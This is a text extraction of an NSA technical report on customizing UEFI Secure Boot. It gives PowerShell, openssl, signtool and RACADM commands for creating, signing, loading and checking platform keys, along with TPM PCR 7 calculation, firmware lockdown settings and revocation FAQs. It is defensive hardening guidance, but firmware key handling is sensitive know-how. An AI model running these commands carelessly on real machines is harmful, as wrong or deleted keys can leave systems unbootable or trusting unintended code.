SignatureOwner 000000000000-0000-0000-000000000000 
Time 2018-01-01-T01:01:01Z 
CertificateFilePath KEK.crt 
FormatWithCert 
SignableFilePath KEK.esl )
$PKobject = ( Format-SecureBootUEFI 
Name PK 
SignatureOwner 00000000-00000000-0000-000000000000 
Time 2018-01-01-T01:01:01Z 
CertificateFilePath
PK.crt 
FormatWithCert 
SignableFilePath PK.esl )
U/OO/168873-20 | PP-23-0464 | Mar 2023 Ver. 1.2
National Security Agency | Cybersecurity Technical Report
UEFI Secure Boot Customization
$dbhashobj = ( Format-SecureBootUEFI 
Name db 
SignatureOwner 000000000000-0000-0000-000000000000 
Time 2018-01-01-T01:01:01Z 
ContentFilePath
helloworld.hsh 
Algorithm sha256 
SignableFilePath dbhash.esl )
PowerShell can also be used to convert ESL files into AUTH files. Only AUTH files can be used
to update Secure Boot values while enforcing signature checks. The PK can sign itself and
KEK(s). A KEK can sign DB data. Similar to Linux, a copy of the unsigned PK file is generated in
case Keytool needs to be executed. Keytool only accepts files with the AUTH extension when
setting the PK. First, convert OpenSSL keys to the PFX format if necessary:
openssl pkcs12 
export 
in PK.crt 
inkey PK.key 
out PK.pfx 
name "PK"
openssl pkcs12 
export 
in KEK.crt 
inkey KEK.key 
out KEK.pfx 
name "KEK"
openssl pkcs12 
export 
in dsk1.crt 
inkey dsk1.key 
out dsk1.pfx 
name
"dsk1"
Next, sign ESL files to create AUTH files:
signtool sign /fd sha256 /p7 .\ /p7co 1.2.840.113549.1.7.1 /p7ce db.auth /a
/f .\KEK.pfx /p password db.esl
signtool sign /fd sha256 /p7 .\ /p7co 1.2.840.113549.1.7.1 /p7ce
dbhash.auth /a /f .\KEK.pfx /p password dbhash.esl
signtool sign /fd sha256 /p7 .\ /p7co 1.2.840.113549.1.7.1 /p7ce KEK.auth
/a /f .\PK.pfx /p password KEK.esl
signtool sign /fd sha256 /p7 .\ /p7co 1.2.840.113549.1.7.1 /p7ce PK.auth /a
/f .\PK.pfx /p password PK.esl
cp PK.esl PKnoauth.auth
Loading data into Secure Boot must be done with the DB or DBX first, then the KEK, and finally
the PK. Once the PK is loaded, Secure Boot will restrict all four value stores to signed updatesonly and may automatically go into enforcing mode. Add the 
AppendWrite flag when loading
the DSK or KEK to append values to the existing entries rather than overwriting existing values.
$dbobject | Set-SecurebootUEFI
$dbhash | Set-SecurebootUEFI -AppendWRite
$KEKobject | Set-SecurebootUEFI
$PKobject | Set-SecurebootUEFI
Alternatively, use the following commands to utilize AUTH files for signed updates ( AppendWrite may also be added to the following commands):
$dbobject | Set-SecurebootUEFI 
SignedFilePath db.auth
$dbhash | Set-SecurebootUEFI 
SignedFilePath dbhash.auth -AppendWrite
$KEKobject | Set-SecurebootUEFI 
SignedFilePath KEK.auth
$PKobject | Set-SecurebootUEFI 
SignedFilePath PK.auth
UEFI Configuration
UEFI Configuration implementations typically have some sort of toggle or mode setting that allows
Secure Boot customization. Some machines may have a state called Setup Mode that allows the
replacement or appending of new values. Setup Mode transitions to User Mode once
customization values are successfully loaded. Some implementations only offer User or Custom
U/OO/168873-20 | PP-23-0464 | Mar 2023 Ver. 1.2
National Security Agency | Cybersecurity Technical Report
UEFI Secure Boot Customization
Mode 
 setup is implied if User/Custom is set while Secure Boot is disabled.
Image 3 shows the customization screen on a Dell OptiPlex 7050. Checking "Enable Custom
Mode" is required to replace or append values. Checking the box does not clear any data from
Secure Boot 
 only the "Replace from File" and "Delete" options clear data. Use the "Replace
from File" option to overwrite the existing PK, KEK, DB, or DBX values. Use the "Append from
File" option to add additional certificates and/or hashes to the factory-default Microsoft and Dell
values. Certificates in the DER format and SHA-256 hashes in the HSH format are accepted.
Images 3 
 Screenshot from a Dell OptiPlex 7050. The Secure Boot Custom Policy configuration options are
shown along with the selections to append, replace, or remove data.
DER and HSH files should be placed on a thumb drive or within the /boot/efi directory for easy
access. Image 4 shows the file browser available through UEFI Configuration. The file browser
does not support all file systems (e.g. NTFS and EXT4 usually are not supported).
U/OO/168873-20 | PP-23-0464 | Mar 2023 Ver. 1.2
National Security Agency | Cybersecurity Technical Report
UEFI Secure Boot Customization
Image 4 
 Screenshot from a Dell Optiplex 7050 showing the file browser available within F2 UEFI
Configuration.
Keytool
Keytool has the ability to edit Secure Boot data stores. First select Edit; then select DB, DBX,
KEK, or PK (PK should be last). The edit screen will show a UUID for each value present. Some
UUIDs may be identical or zeros depending on how each was loaded. Use the Add New Key
option to append a new certificate or hash (ESL or AUTH format required). Use the Replace option
to swap existing UUID entries with new values.
Keytool may or may not have the ability to replace or delete the existing keys and start fresh
depending on UEFI implementation. Keytool is usually a reliable way to replace the PK even when
UEFI configuration or command line calls fail. Keytool is easiest to use when the custom Secure
Boot ESL and AUTH files are located in the same directory as the Keytool.efi file. Launching
Keytool may require setting it as a boot entry via UEFI configuration, efibootmgr in Linux, bcdedit
in Windows, or by launching it via UEFI Shell. See section 4.2.1 for more details.
Dell RACADM
First establish a secure remote connection to the target system. By default, RACADM appends
values to the Secure Boot data stores 
 overwriting is not performed. To delete all existing values,
use:
racadm bioscert delete -all
To selectively delete existing values, use the 
t flag to specify data store (0 for PK, 1 for KEK, 2
for DB, and 3 for DBX), optionally add the 
k value for form factor (0 for certificate, 1 for hash),
and optionally add the 
v flag (certificate thumbprint or hex hash) to remove a specific entry.
U/OO/168873-20 | PP-23-0464 | Mar 2023 Ver. 1.2
National Security Agency | Cybersecurity Technical Report
UEFI Secure Boot Customization
racadm bioscert delete 
t 0 
k 0 
v <PK_thumbprint>
To import new certificates and hashes, use the 
t flag to specify data store and the 
k flag for
form factor. Use the 
f flag for filename.
racadm bioscert import 
t 0 
k 0 
f PK.der
racadm bioscert import 
t 1 
k 0 
f KEK.der
racadm bioscert import 
t 2 
k 0 
f dsk1.der
racadm bioscert import 
t 2 
k 1 
f hash.hsh
4.4 Updates and Changes
Updates and changes require repeating many of the steps found in the "4.3 Initial Provisioning of
Certificates and Hashes" section. Updates to the DB or DBX must be signed by a KEK. Updates
to a KEK must be signed by the PK. Unsigned updates or "noauth" updates are not permitted
while UEFI Secure Boot is in enforcing, user, or custom mode (vendors may use different
terminology).
4.4.1 Update the PK
First, identify the mechanism for loading the new PK. Remote console, UEFI configuration, and
Keytool typically permit PK replacement once Secure Boot has been temporarily disabled or
placed into Custom/Setup mode. Run-time scripting solutions and Keytool require the new PK to
be signed by the old PK when replacing the PK value while Secure Boot is active/enforcing, and
physical presence is usually required to confirm the change on next boot.
Continue by ensuring the new PK is in the proper format and state for the selected loading
method. Create a new RSA 2048 key pair and certificate unless a certificate has already been
provided for use. Have a CA sign the certificate, if required, before use. For UEFI configuration
and scripting solutions, ensure that the certificate is in DER/CER format and convert if necessary.
For Keytool and console commands, create an ESL file, unsigned "noauth" file based on the ESL,
self-signed AUTH file, or AUTH file signed by the currently loaded PK which will be replaced.
Finally, validate that Secure Boot is enabled and query the UEFI variable representing the new
PK. Verify that the new PK is utilized.
4.4.2 Update a KEK
First, identify the mechanism for loading the new KEK. Remote console, scripting, UEFI
configuration, and Keytool are all possible solutions. Remote console, UEFI configuration, and
Keytool usually allow unsigned KEK changes while Secure Boot is disabled. Remote console and
UEFI configuration usually allow unsigned KEK changes while Secure Boot is in Custom/User
mode. Run-time scripting solutions and Keytool require each KEK update ESL to be signed by
the PK while Secure Boot is active/enforcing. The existing KEKs may optionally be preserved
when loading the new KEK.
Continue by ensuring the new KEK is in the proper format and state. Create a new RSA 2048 key
pair and certificate unless a certificate has already been provided for use. Have a CA sign the
certificate, if required, before use. For UEFI configuration and scripting solutions, ensure that the
certificate is in DER/CER format and convert if necessary. For Keytool and console commands,
create an ESL file and, if available, a PK-signed AUTH file.
Finally, validate that Secure Boot is enabled and query the UEFI variable representing the new
KEK. Consider testing the new KEK by signing DB and/or DBX changes following the instructions
U/OO/168873-20 | PP-23-0464 | Mar 2023 Ver. 1.2
National Security Agency | Cybersecurity Technical Report
UEFI Secure Boot Customization
in the next section.
4.4.3 Update the DB or DBX
First, identify the mechanism for loading the new DB or DBX value. Remote console, scripting,
UEFI configuration, and Keytool are all possible solutions. DB updates can take the form of
certificates, SHA-256 hashes, or ESL/AUTH files. DB updates that are signed by a KEK are
permissible at all times. Unsigned updates can be accomplished via UEFI Configuration and
remote console tools.
Continue by ensuring that the new DB entry is in the correct format. For a certificate, create a new
RSA 2048 key pair and certificate unless a new certificate has already been provided for use.
Convert to DER/CER format if in PEM/CRT format. Place the certificate in an ESL file and sign it
with a KEK for the endpoint receiving the update.
For a hash, validate that the SHA-256 format is correct. Convert the hash file into an ESL file.
Have the private key of a KEK sign the ESL file to convert the ESL into an AUTH file.
4.4.4 Update MOK or MOKX
Changes to MOK and MOKX require the use of mok-manager (mmx64.efi), mok-util (mok-util.efi),
or Keytool (keytool.efi). Keys and hashes used are identical to those stored in the DB and DBX.
However, MOK tools require data to be provided in only ESL or AUTH format. Section 4.3.4
provides instructions for interacting with Keytool.
4.5 Validation
UEFI Messages
UEFI error messages are normally printed to the primary display adapter and logged in the UEFI
and OS event logs. Remote management tools, such as Dell iDRAC and HP iLO, also register
UEFI events in a Baseband Management Controller (BMC) log. Some systems provide only error
messages while other systems may also provide success messages. An absence of error
messages, Secure Boot enabled in custom mode, and successful boot may indicate a valid
launch. However, administrators should double-check that the signatures on bootable binaries
match trusted certificates. Unintentionally leaving MOK or the Windows Production CA certificates
in place is a common implementation oversight that looks like a success. Untrusted code may
also be skipped, without an error message, hiding a potential problem.
Linux
Use dmesg to determine if Secure Boot is enabled, enforcing, and what values are in use. The
first command below will show only Secure Boot status. A status of "could not be determined"
means that Secure Boot is not operating. The second command will return summary information
about value stores, certificates, and hashes detected during boot (value stores can be read
without Secure Boot being in an enforcing mode). Both commands may be run with user
permissions.
dmesg | grep 
i "secure boot"
dmesg | grep 
i uefi
More specific information can be gathered via using efi-readvar. In particular, watch for the
presence of unintended certificates in the DB or MOK. Use the -v and -s options to select a specific
variable type and entry:
U/OO/168873-20 | PP-23-0464 | Mar 2023 Ver. 1.2
National Security Agency | Cybersecurity Technical Report
UEFI Secure Boot Customization
efi-readvar
efi-readvar 
v db 
Finally, mokutil can be queried to check Secure Boot enforcement status by using the following
command:
mokutil --sb-status
PowerShell
PowerShell has a straightforward way to verify that Secure Boot is enabled, loaded with keys,
and enforcing. The following command will return True when Secure Boot is not disabled, has a
PK, and bootable binaries passed signature checks.
Confirm-SecureBootUEFI
Dell RACADM
Use the following command:
racadm get BIOS.SysSecurity.SecureBoot
A result of "enabled" or 1 indicates that Secure Boot is successfully provisioned and enforcing on
the queried endpoint.
5. Advanced Customizations
Secure Boot is designed to complement many existing security solutions. Technologies such as
security chips, boot image protection, memory protections, side channel mitigations, virtualization,
malware scanners, and similar can operate alongside Secure Boot. This section focuses on a pair
of boot security solutions that may seem redundant with Secure Boot. However, proper
implementation can provide a defense-in-depth security solution.
5.1 Trusted Platform Module (TPM)
Trusted Platform Module (TPM) may be leveraged to validate the integrity of UEFI Secure Boot.
TPM Platform Configuration Register (PCR) 7 captures integrity measurement events that
summarize the PK, KEK, DB, and DBX. Use the values contained within the PK, KEK, DB, and
DBX to calculate what PCR 7 should be, and compare the calculated value to the value reported
at run time.
Note that Shim extends MOK, MOKX, GRUB, and kernel measurements into PCR 7. Be sure to
include these extensions when calculating PCR 7. Remember that MOK is similar to the DB while
MOKX is similar to the DBX.
A TPM Quote Digest is a summary of PCR values. A PCR is a digest/summary of individual
measurement events. A measurement event contains the Event Digest which, in the case of PCR
7, is the summary/hash of an individual UEFI variable.
Figure 6 -shows the relationship between TPM Quote, PCR, and Event/Measurement. TPM
Quotes, PCRs, and measurement events are made up of a series of one-way SHA hashes.
Knowing the data used to create a measurement event allows administrators/developers to wrap
the data in the appropriate structures and calculate the measurement event. Knowing all the
measurement events for a specific PCR allows an administrator/developer to calculate the PCR.
Knowing all the PCR values allows an administrator/developer to calculate a Quote. The reverse
direction is not possible due to the one-way nature of SHA hashes and TPM extensions.
U/OO/168873-20 | PP-23-0464 | Mar 2023 Ver. 1.2
National Security Agency | Cybersecurity Technical Report
UEFI Secure Boot Customization
TPM PCR Hash Relationships
Quote
Digest
PCR 0
Event
Event
PCR 1
[...]
Event
Event
Event
[...]
[...]
Event
PCR n
Event
Event
[...]
Event
Figure 6 - The relationship between Quote, PCR, and Event/Measurement.
To calculate PCR 7 when Secure Boot values are known, consult the TCG EFI Platform
Specification (TCG 2014; Section 7.1). Each TPM event log record contains the following
information found in section 7.1:
typedef struct{
TCG_PCRINDEX
TCG_EVENTTYPE
TCG_DIGEST
UINT32
UINT8
PCRindex;
EventType;
Digest;
//Event measurement
//Hash of EFI_VARIABLE_DATA
EventSize;
Event[1]; //EFI_VARIABLE_DATA
} TCG_PCR_EVENT;
The measurement information used to extend PCRs is captured in the TCG_PCR_EVENT
TCG_DIGEST object as defined in the UEFI Specification (TCG 2014; Section 7.8). The Digest will
be a SHA-1 hash in the case of TPM 1.x. In the case of TPM 2.x TCG_PCR_EVENT records for
SHA-1, SHA-256, SHA-384, SHA-512, and/or other hash algorithms will be recorded since TPM
2.x supports multiple collections of PCRs at different hash strengths (TPM 2.x is 
Crypto Agile
with a wide variety of implementations possible).
The Digest values are not hashes of raw data, defined as individual certificates and hashes,
present in the DB, DBX, KEK, and PK. Digest values are hashes of the raw data wrapped in EFI
metadata. In other words: Secure Boot data records, such as a DB hash or a KEK certificate, are
placed in an EFI_SIGNATURE_DATA structure that is a component of the EFI_VARIABLE_DATA
structure. EFI_VARIABLE_DATA is the structure that is hashed to form a TCG_DIGEST
measurement which is extended to a PCR.
Each Digest value is the hash of an EFI_VARIABLE_DATA structure. EFI_VARIABLE_DATA is
defined by UEFI Forum
s UEFI Specification (UEFI Forum 2017; Section 31.4). For each Secure
Boot entry in the PK, KEK, DB, and DBX, hash the following structure to determine the
measurement data used to extend a PCR:
typdef struct{
EFI_GUID
UINT8
UINT8
SignatureData[]
VariableName;
//see table below
UnicodeNameLength; //db, PK = 2; dbx, KEK = 3
VariableDataLength; //SignatureOwner +
U/OO/168873-20 | PP-23-0464 | Mar 2023 Ver. 1.2
National Security Agency | Cybersecurity Technical Report
UEFI Secure Boot Customization
CHAR16
unicode chars
UINT8
Unicodename[];
//db, dbx, KEK, PK in
VariableData[];
//EFI_SIGNATURE_DATA
} EFI_VARIABLE_DATA
EFI_GUID values are also defined by the UEFI Forum standards body (UEFI Forum 2017; Section
7.3). EFI_GUID values used to describe TPM events are similar to the ones found in ESL files.
Table 2 shows the GUIDs that are likely to be observed.
EFI_GUID
Value
DB and DBX records identified as
EFI_IMAGE_SECURITY_DATABASE_GUID
0x719B2CB, 0x93CA, 0x11D2, 0Xaa, 0x0D, 0x00, 0xE0,
0x98, 0x03, 0x2B, 0x8C
PK and KEK records identified as
EFI_GLOBAL_VARIABLE
0x8BE4DF61, 0x93CA, 0x11D2, 0xAA, 0x0D, 0x00,
0xE0, 0x98, 0x03, 0x2B, 0x8C
Table 2 
 EFI GUIDs observed with TPM events.
The UINT8 VariableData array contains the structure EFI_SIGNATURE_DATA. The entire
certificate or hash binary blob contributing to a given PCR event/measurement is stored in the
SignatureData array.
typdef struct{
EFI_GUID
UINT8
SignatureOwner;
SignatureData[]; //certificate or hash raw data
} EFI_SIGNATURE_DATA
5.2 Trusted Bootloader
Trusted bootloaders use both UEFI Secure Boot and TPM. Secure Boot performs an active boottime signature enforcement role while TPM records the state of the machine during UEFI
initialization 
 that is to say TPM provides a check on Secure Boot's state. Examples of trusted
bootloaders include Trusted Shim (TPM-extended Shim), Trusted GRUB, Trusted Boot (TBoot),
TPM-rEFInd, newer Windows bootloaders, and similar boot-time security solutions. Some trusted
bootloaders can be provided a "check file" or "configuration file" that includes TPM PCR hashes.
The bootloader and supporting check/configuration file may also be signed by a key recognized
by Secure Boot.
The TPM PCR values queried at boot time may differ from those reported from within the
operating system. Bootloaders typically do not extend PCRs 0-3. Shim is known to extend PCR
Always validate the signatures present on a bootloader. Bootloaders typically have a signature
from the OS vendor or Microsoft which are typically intended for use with Secure Boot in the
default, system vendor-provided state. When customizing Secure Boot, always ensure that
specific bootloaders work as intended. Developing the Secure Boot customization guidance in
this document revealed a common mistake of accidentally leaving a DB or MOK certificate behind
resulting in trusting more hardware and software objects than intended at boot time.
Some bootloaders are incorporated into Full Disk Encryption (FDE) solutions and wrap a
decryption key with a specific set of TPM PCR values. Ensure that PCR 7 is one of the PCRs in
U/OO/168873-20 | PP-23-0464 | Mar 2023 Ver. 1.2
National Security Agency | Cybersecurity Technical Report
UEFI Secure Boot Customization
the selection mask. A PCR-wrapped secret will only be revealed when PCR 7 is in the correct
state thus providing confidence in the integrity of Secure Boot values corresponding to a specific
PCR 7 value.
6 References
6.1 Cited Resources
Golden, Barry. "Windows UEFI firmware update platform." Windows Documents, Microsoft
Corporation, 20 Apr. 2017, https://docs.microsoft.com/en-us/windowshardware/drivers/bringup/window-uefi-firmware-update-platform
Mendelsohn, Tom. "Secure Boot snafu: Microsoft leaks backdoor key, firmware flung wide
open." Ars Technica, Conde Nast, 11 Aug. 2016, https://arstechnica.com/informationtechnology/2016/08/microsoft-secure-boot-firmware-snafu-leaks-golden-key
Schlej, Nikolaj. Twitter. 27 Sep. 2018.
https://twitter.com/NikolajSchlej/status/1045359752077660161
Shilov, Anton. "Intel to Remove Legacy BIOS Support from UEFI by 2020." AnandTech, Future
PLC, 22 Nov. 2017, https://www.anandtech.com/show/12068/intel-to-remove-bios-support-fromuefi-by-2020
Trusted Computing Group (TCG). "TCG EFI Platform Specification For TPM Family 1.1 or 1.2."
TCG Published Specifications. 27 Jan. 2014, https://trustedcomputinggroup.org/wpcontent/uploads/TCG_EFI_Platform_1_22_Final_-v15.pdf
UEFI Forum. "Unified Extensible Firmware Interface Specification." UEFI Forum Published
Specifications. May 2017, https://uefi.org/sites/default/files/resources/UEFI_Spec_2_7.pdf
6.2 Command References
Bottomley, James. "UEFI Secure Boot." James Bottomley
s random Pages. 8 Jul. 2012.
https://blog.hansenpartnership.com/uefi-secure-boot
Murphy, Finnbarr. "List EFI Configuration Table Entries." Musings of an OS plumber. 24 Oct.
2015. https://blog.fpmurphy.com/2015/10/list-efi-configuration-table-entries.html
Sakaki. "Sakaki
s EFI Install Guide/Configuring Secure Boot." Gentoo Wiki, Gentoo Linux. 29
Aug. 2017. https://wiki.gentoo.org/wiki/Sakaki
s_EFI_Install_Guide/Configuring_Secure_Boot
6.3 Uncited Related Resources
Hucktech. Firmware Security. 28 Jan. 2019. https://firmwaresecurity.com
NSA analysts, researchers, and contractors who contributed to pilots of customized Secure
Boot. See https://www.github.com/nsacyber/Hardware-and-Firmware-SecurityGuidance/tree/master/secureboot for more resources, scripts, and solutions.
Partners, vendors, and support personnel who provided information and produce improvements.
U/OO/168873-20 | PP-23-0464 | Mar 2023 Ver. 1.2
National Security Agency | Cybersecurity Technical Report
UEFI Secure Boot Customization
7 Appendix
7.1 UEFI Lockdown Configuration
Option
Admin password
Recommended
Setting
Boot mode
Boot sequence
C states / S3 sleep
Comment
UEFI administrative control options access
UEFI
Use UEFI boot mode instead of Legacy, CSM, or
BIOS
OS drive first. Disable devices not used for boot
Enable
CPU energy-saving features
Chassis intrusion
Log case-opening events
Computrace
Anti-theft solution on some machines
CPU XD support
Enable
Execute-disable bit feature
eSATA port
Disable
Enable if external SATA ports are used
ExpressCard
Disable
Enable if required by expansion device
Extended Page Tables / EPT
Enable
Intel-only. Equivalent to RVI
External USB ports
Disable unused ports
Fan control
Auto
Customizable cooling fan thresholds/levels
Fastboot
Auto
Shortens some device self-check routines
Free-fall protection
Relevant to spinning platter hard drives
HyperThread / SMT
Enable
Integrated NIC
Enable
Internal modem
Disable
Keyboard backlight
Legacy OROMs
Disable
Optimus / Dynamic graphics
OROM keyboard access
Enable
Laptops with hot-swap bays; Controls disc media
device
Controls energy use, heat, and performance of
Disable
Do not allow non-admins to alter system config
Enable
Only allow admins into UEFI config
Enable/Auto
Energy-saving graphics switching
Disable
Overclocking
Parallel Port
Disable unless required by expansion devices
(video card, storage controller, etc.)
Defer to organizational policies
Multi-core support
Non-admin password
changes
Non-admin user setup
lockout
Enable if required for legacy network
May have levels of brightness
Microphone
Module bay
CPU scheduling optimizer
Enable PXE if required by organization; Disable if
not used
Only enable for administrators
Increase CPU performance above factory limits
Disable
Enable if required for legacy device
Password bypass
Defer to organizational policies
Password configuration
Defer to organizational policies
Rapid start
Accelerated boot from slow storage drives
U/OO/168873-20 | PP-23-0464 | Mar 2023 Ver. 1.2
National Security Agency | Cybersecurity Technical Report
UEFI Secure Boot Customization
Option
Recommended
Setting
Rapid virtualization indexing
/ RVI
Enable
AMD-only. Equivalent to EPT
SATA Operation
AHCI
Enable RAID or IRST (Intel Rapid Storage
Technology) if appropriate
SATA password
Not set
Stops boot drive access. Interrupts updates
SATA ports
Connected only
Comment
Disable SATA ports not in use
Secure Boot custom mode
Disable
Enable custom if using custom key chain
Serial Port
Disable
Enable if required for legacy device
SMART Reporting
Enable
Storage drive error reporting mechanism
SmartCard
Storage drive error reporting function
SpeedStep / CPU power
states
Enable
CPU energy-saving features
Storage OROM access
Disable
Only enable for administrators
Strong passwords
Enable
Applies password complexity requirements to
UEFI configuration accounts
System password
Not set
Stops system boot process. Interrupts updates
Tagged TLB
Enable
TPM ACPI support
TPM PPI deprovision
override
Enable
Controls loading of measurements during boot
Enable
Allows OS to clear and re-enable TPM
TPM PPI provision override
Enable
Allows OS to activate TPM
TPM security
Enable and
Activate
Send power and I/O to the TPM
Windows: used when Trusted eXecution Engine
(TXE) is installed. Linux and hypervisors: install
TBoot and follow directions. Provision with TXT
disabled. Enabling TXT locks NVRAM
Trusted execution / TXT
TurboBoost / TurboCore
Enable
UEFI Network Stack
Enable
UEFI Secure Boot
Enable
Unobtrusive mode
CPU performance boost feature
Enable if PXE or image servers are used by
organization; Disable if not used
Use in conjunction with supporting OS and/or
hypervisor
Disables or dims system indicator lights
USB Boot Support
Disable
Allows USB devices to boot; May be needed by
some developers
USB power share
Disable
Charges devices through USB power
USB wake support
Allow USB devices to wake computer on action
User password
UEFI user boot configuration options access
Video adapter
Auto
Switches between integrated and discrete
graphics if present
Virtualization / VT-x / VPro
Enable
Virtualization extensions for hypervisors
VT-d / Virt directed I/O
Enable
Hypervisor performance optimization
Wake on AC
U/OO/168873-20 | PP-23-0464 | Mar 2023 Ver. 1.2
Influences boot behavior after power loss
National Security Agency | Cybersecurity Technical Report
UEFI Secure Boot Customization
Option
Recommended
Setting
Comment
Allows monitoring of network traffic for wake
commands
Wake on LAN
Webcam
Wireless switch changes
Defer to organizational wireless access policy
WLAN
Wireless network toggle
WWAN
Cellular network toggle
XMP memory profiles
High-performance RAM profiles
7.2 Acronyms
Acronym
Meaning
ACPI
Advanced Configuration and Power Interface
Microsoft corporation product Active Directory
AHCI
Advanced Host Controller Interface
Microprocessor company named Advanced Micro Devices
Microprocessor company formerly known as Advanced RISC Machine
Boot Device Select UEFI boot phase
BIOS
Basic Input/Output System
Baseband Management Controller
Certificate Authority
Central Processing Unit
CRTM
Core Root of Trust for Measurement starts system integrity hashing chain
Compatibility Support Module providing some BIOS functions omitted from UEFI
Secure Boot Allow list Database
Database Key used with Secure Boot databases
Secure Boot Deny list Database
US government Department of Defense
Disk Operating System
Driver Execution Environment UEFI boot phase
Extensible Firmware Interface 
 the foundation which UEFI is built upon. Originally
created by Intel corporation as a proprietary solution. Binaries designed to run in the
UEFI environment may also be called EFI binaries as opposed to UEFI binaries
Extended Page Tables Intel corporation equivalent to RVI
eSATA
External Serial Advanced Technology Attachment
FIPS
Federal Information Processing Standard
GNOME
Linux desktop user environment
GUID Partitioning Table
GRUB
Linux boot loader
Graphical User Interface
Hard Disk Drive
Input/Output
U/OO/168873-20 | PP-23-0464 | Mar 2023 Ver. 1.2
National Security Agency | Cybersecurity Technical Report
UEFI Secure Boot Customization
Acronym
Meaning
Integrity Measurement Architecture provides runtime TPM hashing
IRST
Intel corporation Rapid Storage Technology for attached storage disks
Information Technology (department or device)
Secure Boot Key Exchange Key
Local Area Network connection
Launch Control Policy used by TBoot
LDAP
Lightweight Directory Access Protocol is Linux equivalent to Microsoft AD
LUKS
Linux Unified Key Setup used for drive encryption
Master Boot Record partition scheme
MBR2GPT
Utility to convert from MBR disks to GPT disks
Machine Owner Key used for Linux extension of Secure Boot
Network Interface Controller
NVRAM
Non-Volatile Random-Access Memory storage space on TPMs
OROMs
Option Read-Only Memory firmware configuration branching mechanism
Operating System such as Microsoft Windows or Red Hat Linux
Personal Computer
Platform Configuration Register used by TPM to store hashes of integrity hashes
Pre-EFI Initialization phase for UEFI boot
Secure Boot Platform Key
Physical Presence Interface
RAID
Redundant Array of Independent Disks
Random-Access Memory
rEFInd
UEFI Boot Loader
RHEL
Red Hat Enterprise Linux operating system
RISC
Reduced Instruction Set Computer
Read-Only Memory
Ron Rivest, Adi Shamir, and Leonard Adleman cryptosystem algorithms
Rapid Virtualization Indexing AMD corporation equivalent to EPT
Sleep state 3 shuts down power to most PC components except RAM
SATA
Serial Advanced Technology Attachment
Security phase of UEFI boot
Secure Hashing Algorithm
Symmetric Multithreading for multiple CPU cores, threads, paths
TBoot
Trusted Boot open source Intel mechanism
Translation Look-aside Buffer memory management accelerator
Trusted Platform Module security chip
Trusted Execution Environment restricted kernel memory space
Intel corporation Trusted Execution Technology
UEFI
Unified Extensible Firmware Interface that is a derivative from the proprietary EFI
solution created by Intel corporation. Governed by an industry consortium called the
UEFI Forum
U/OO/168873-20 | PP-23-0464 | Mar 2023 Ver. 1.2
National Security Agency | Cybersecurity Technical Report
UEFI Secure Boot Customization
Acronym
Meaning
Universal Serial Bus connects peripheral devices
Volume Management Key for Microsoft Bitlocker
VPRO
Intel corporation branding for devices supporting multiple virtualization enhancements
and TBoot
Virtual Secure Mode suite of device-hardening features in Microsoft Windows
VT-d
Virtualization Technology for Directed I/O
WLAN
Wireless Local Area Network
WLAN
Wireless Local Area Network
WWAN
Wireless Wide Area Network normally indicates presence of cellular adapter
Execute Disable bit allows CPU to disable execution in memory spaces
Extreme Memory Profile used for controlling RAM timing
7.3 Frequently Asked Questions (FAQ)
Does Secure Boot customization require replacing the PK and KEK?
No. Secure Boot customization can be partial in implementation. Customizers may add/append
additional records to the DB, DBX, or KEK without clearing or replacing existing values. Likewise,
customizers may remove individual records from the DB, DBX, or KEK rather than completely
clearing each value store.
What is the difference between the Microsoft Windows Production CA and UEFI Third Party
Marketplace CA DB certificates?
The Microsoft Windows Production CA signs all things specific to the Windows operating system
environment. The Windows boot manager, kernel, and drivers are commonly validated by the
Production CA cert. The UEFI Third Party Marketplace CA signs content not related to Windows
such as storage controller firmware, graphics card firmware, UEFI driver modules, and Linux
bootloaders.
How do I make a driver compatible with Secure Boot?
Many Linux anti-malware solutions include drivers that do not have Secure Boot signatures. To
solve the problem, do not disable Secure Boot. Instead, create an RSA 2048 public key certificate.
Use the corresponding private key to sign the driver using sbsigntool, pesign, or similar. Switch
to Secure Boot custom/user mode in the UEFI configuration, and then append the custom
certificate into the machine's DB using UEFI configuration, Keytool, or similar. Do not make
changes to the PK, KEK, or DBX. The driver should be validated by the custom certificate
following the next boot. Remember to sign updates to the driver before distributing to endpoints.
How do I revoke a threat like BlackLotus or BootHole or similar signed EFI executable?
Revoking signed EFI executables requires updating the DBX. If system and OS vendors are
unable to provide DBX updates, then the customer may need to produce their own. Follow these
steps:
1. Identify specific EFI binaries that need to be revoked.
2. Calculate hashes for the EFI binaries. Note that tools aware of Portable Executable
(PE/EFL) format must be used. A sha256sum or OpenSSL digest hash of an entire binary
will result in the wrong hash. Only executable portions of the binary are hashed for
inclusion into the DB/DBX. See section 4.3.3.
U/OO/168873-20 | PP-23-0464 | Mar 2023 Ver. 1.2
National Security Agency | Cybersecurity Technical Report
UEFI Secure Boot Customization
3. If your BIOS, UEFI configuration, or remote management tool accepts hashes, then submit
them.
4. If hash files were not sufficient, then create ESL files. Try to load the ESL files.
5. If the ESL files are rejected, it
s likely due to a lack of signature. Follow instructions in
section 4.3.1 to create a key and certificate used when signing ESL files. This new
certificate may need to be loaded to the DB or as the PK.
6. Use the new certificate and key to sign ESL files into AUTH files.
7. Install the new hashes and possibly the new certificate following instructions in section
4.3.4.
How do I revoke signatures?
First, determine which certificate is responsible for validating a revoked signature. UEFI Secure
Boot has limited space available 
 the amount varies based on make and model of device. If a
large number of signatures are to be revoked, consider migrating to a new certificate and placing
the old one in the DBX. If a manageable number of signatures are to be revoked, create a list of
SHA-256 hashes corresponding with each binary to be revoked. Compile the hashes into an ESL
file. Use Keytool to load the ESL file into the DBX at boot time.
Does UEFI Secure Boot understand Certificate Revocation Lists (CRL)?
No. Most UEFI implementations lack the memory space and processing power needed to
navigate the internet and parse CRL information. Revocations and certificate chains are ignored
by Secure Boot. Software and system vendors usually provide DBX patches to handle revocation
actions.
My endpoint won't accept a new KEK, DB, or DBX entry. What should I do?
First, check the firmware version of the endpoint to determine if an update is available. Individual
firmware releases can contain bugs to the Secure Boot customization implementation. Next,
check to see if there are known limitations to a specific make and model of endpoint. You may
need to reach out to the system vendor if a firmware update does not resolve the problem and
firmware storage capacity is not an issue.
Where is MOK and MOKX?
Machine Owner Key (MOK) and MOK Exclusion (MOKX) are extensions of UEFI Secure Boot.
The bootloader Shim is responsible for setting up MOK and MOKX. Shim is usually found on
Linux systems and not found on Windows systems. MOK and MOKX do not exert any
enforcement action until the Bootloader Phase of UEFI Boot (i.e. boot devices, OROMs, and
firmware modules are not checked against MOK and MOKX).
Shim features a signature from Microsoft and embedded MOK certificate from a Linux distribution
or power user. Shim and MOK allow the open source software community to realize the
advantages of Secure Boot without needing to seek Microsoft review/approval for every
